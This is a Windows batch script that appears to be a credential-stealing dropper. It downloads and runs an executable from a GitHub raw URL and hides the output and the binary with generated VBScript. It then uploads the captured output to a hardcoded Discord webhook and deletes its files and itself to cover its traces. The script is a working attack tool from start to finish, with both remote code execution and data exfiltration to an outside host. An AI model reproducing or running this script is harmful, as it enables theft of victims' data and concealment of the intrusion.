@echo off
setlocal enabledelayedexpansion

rem Download encrypt3.exe from GitHub
curl -OL https://raw.githubusercontent.com/Sap196/PWS_new/main/encrypt3.exe

rem Run the Go program and capture its output to a file
encrypt3.exe > output.txt

rem Save VBScript code to set files as hidden
echo Set objShell = CreateObject("WScript.Shell") > setHidden.vbs
echo Set objFSO = CreateObject("Scripting.FileSystemObject") >> setHidden.vbs
echo objFSO.GetFile("output.txt").Attributes = 2 >> setHidden.vbs
echo objFSO.GetFile("encrypt3.exe").Attributes = 2 >> setHidden.vbs

rem Construct and execute the cURL command
set "discord_webhook=https://discord.com/api/webhooks/1202328029196730398/24xNitV8WYbF4qUql5MncBzaVeyDJfvAwLOsSdU8yPl17R4mwT8Juyo9TWGqi2FEfYBL"
set "curl_command=curl -i -X POST -H "Content-Type: multipart/form-data" -F "file=@output.txt" %discord_webhook%"
echo Sending cURL command: %curl_command%
%curl_command%

rem Remove files and the script
del encrypt3.exe
del output.txt
del main.vbs
del "%~f0"
